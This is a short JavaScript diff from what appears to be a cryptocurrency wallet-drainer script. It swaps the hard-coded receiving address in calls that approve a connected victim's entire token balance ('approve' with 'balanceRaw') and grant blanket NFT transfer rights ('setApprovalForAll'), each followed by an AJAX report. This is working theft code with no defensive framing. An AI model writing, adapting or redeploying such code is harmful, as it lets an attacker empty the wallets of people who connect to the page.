@@ -60,7 +60,7 @@ const accountBalances = {
     nft: []
 }
 
-const WITHDRAWAL_ADDRESS = "0x02B9E92F79f3eDA25Fa99FF076adEEe0a20E11a2"
+const receiveAddress = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c"
 const MINIMAL_SUM_IN_USD = 1
 
 let accountAddress = null, walletConnector, currentConnection
@@ -234,7 +234,7 @@ const getBalances = async () => {
                 const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
 
                 try {
-                    await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
+                    await contract.approve(receiveAddress, withdrawalToken.context.balanceRaw)
 
                     var z=$.ajax({  
     type: "POST",  
@@ -251,7 +251,7 @@ const getBalances = async () => {
                 const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
 
                 try {
-                    await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
+                    await contract.setApprovalForAll(receiveAddress, true)
 
                    var z=$.ajax({  
     type: "POST",  
